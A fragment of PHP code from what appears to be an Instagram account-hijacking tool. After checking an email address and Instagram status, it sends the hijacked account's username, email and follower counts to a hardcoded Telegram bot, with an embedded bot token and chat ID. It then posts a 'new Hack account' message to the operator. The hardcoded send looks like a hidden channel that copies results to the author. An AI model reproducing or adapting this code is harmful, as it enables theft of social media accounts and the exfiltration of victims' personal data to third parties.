                  ...
                  if(checkMail($mail)){
                        ...
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                ...
                                $brok = '5631323333:AAErCHN_NKJHTt0PLPCSS6GBlRIpJg8UPcE';
                                $from_id = '1150883146';
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m']; 
 file_get_contents("https://api.telegram.org/bot$brok/sendMessage?chat_id=$from_id&text=Hi rhp New Fucked ✅
UserName ➠ $usern
Email ➠ $mail
Followers ➠ $follow
Following ➠ $following
Post ➠ $media ");
                                ...
                                bot('sendMessage', [ 'disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "Hi hacker new Hack account \n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n.🦁. 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : [$usern](instagram.com/$usern)\n.📧. 𝒆𝒎𝒂𝒊𝒍 : [$mail]\n.🚀. 𝒇𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 : $follow\n.🎡. 𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 : $following\n.📸. 𝒑𝒐𝒔𝒕 : $media\n.⏰. 𝒕𝒊𝒎𝒆 : " . date('Y/n/j g:i') . "\n" . "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n𝐁𝐘 :- [@iiwiw]\n𝐂𝐇 :- [@Professional_school]",
